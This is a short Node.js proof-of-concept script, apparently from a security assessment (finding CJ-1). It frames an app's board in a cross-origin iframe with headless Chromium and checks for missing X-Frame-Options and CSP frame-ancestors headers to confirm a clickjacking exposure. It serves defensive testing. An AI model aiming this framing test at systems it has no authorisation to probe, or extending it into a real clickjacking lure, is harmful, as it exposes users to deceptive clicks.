// Clickjacking (SECURITY_ASSESSMENT.md — CJ-1): the server sets no X-Frame-Options
// and no Content-Security-Policy frame-ancestors, so any site can iframe the board.
// This matters because the board is intended to be embedded in a third-party site.
//
// Usage: node security/poc/browser/clickjacking.js [http://localhost:8080]
function loadPlaywright(){for(const p of ['playwright','/opt/node22/lib/node_modules/playwright']){try{return require(p);}catch(e){}}console.error('playwright not found');process.exit(2);}
const { chromium } = loadPlaywright();
const base = process.argv[2] || 'http://localhost:8080';
(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  // an attacker-controlled page on a DIFFERENT origin frames the board
  await page.setContent(`<h3>totally unrelated site</h3><iframe src="${base}/b/victimroom" width="800" height="600"></iframe>`);
  await page.waitForTimeout(1500);
  const framed = await page.evaluate(() => {
    const f = document.querySelector('iframe');
    try { return { loaded: !!f, docReachable: !!(f.contentWindow), blocked: false }; }
    catch (e) { return { loaded: !!f, blocked: true }; }
  });
  // If the browser refused to frame it, the iframe load would be blocked by XFO/CSP.
  const hdr = await (await fetch(base + '/b/victimroom')).headers;
  await browser.close();
  console.log('[*] X-Frame-Options:', hdr.get('x-frame-options') || '(none)');
  console.log('[*] Content-Security-Policy:', hdr.get('content-security-policy') || '(none)');
  if (!hdr.get('x-frame-options') && !hdr.get('content-security-policy')) {
    console.log('[+] CLICKJACKING CONFIRMED — no framing protection; the board renders inside a cross-origin iframe.');
    process.exit(0);
  }
  console.log('[-] framing protection present'); process.exit(1);
})().catch(e => { console.error('ERR', e.message); process.exit(1); });
